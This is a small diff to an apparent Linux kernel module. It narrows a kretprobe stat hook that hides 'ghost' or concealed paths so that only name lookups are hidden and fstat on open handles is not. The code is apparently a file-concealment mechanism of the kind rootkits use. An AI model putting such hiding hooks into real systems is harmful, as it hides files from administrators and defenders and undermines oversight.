@@ -159,7 +159,12 @@ static int nm_gp_stat_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 	struct nm_gp_ctx *ctx = (struct nm_gp_ctx *)ri->data;
 	const struct path *path = (const struct path *)regs->regs[0];
 
-	ctx->hide = ghost_hidden_path(path) || nm_gp_owner_concealed(path);
+	/* A lookup by name passes a struct path from the stack and is answered here. A path
+	 * anywhere else is a struct file's f_path: fstat or statx(AT_EMPTY_PATH) through a
+	 * handle the caller already holds, which stock answers for any live file. The in-tree
+	 * cloak gates the lookup in vfs_statx() and leaves those alone too. */
+	ctx->hide = nm_gp_on_task_stack(path) &&
+		    (ghost_hidden_path(path) || nm_gp_owner_concealed(path));
 	return 0;
 }
 
